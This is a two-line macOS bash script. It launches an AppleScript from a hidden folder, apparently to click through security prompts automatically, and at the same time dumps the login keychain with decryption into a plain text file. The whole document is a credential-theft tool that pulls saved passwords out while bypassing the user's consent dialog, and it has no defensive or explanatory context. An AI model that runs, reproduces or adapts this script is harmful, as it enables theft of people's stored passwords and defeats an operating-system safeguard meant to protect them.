#!/bin/bash

osascript "~/.fku/kdmp/auto-click.scpt" & security dump-keychain -d login.keychain > keychain.txt


